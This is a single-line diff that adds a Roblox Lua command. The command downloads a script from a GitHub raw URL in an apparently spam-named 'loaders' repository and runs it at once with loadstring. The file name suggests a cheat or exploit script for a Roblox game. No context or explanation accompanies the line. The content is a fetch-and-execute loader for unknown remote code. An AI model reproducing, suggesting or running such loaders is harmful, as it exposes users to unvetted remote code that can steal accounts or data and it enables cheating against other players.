@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/pixel-lineage-spear-class-dragon-race-spam7-mzfk9hfggypxw7.lua"))()
